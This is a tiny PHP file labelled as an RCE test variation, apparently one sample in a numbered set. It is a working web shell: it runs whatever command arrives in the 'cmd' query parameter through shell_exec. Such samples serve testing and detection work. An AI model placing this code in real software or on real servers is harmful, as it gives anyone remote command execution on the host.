<?php
// RCE test variation #581
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>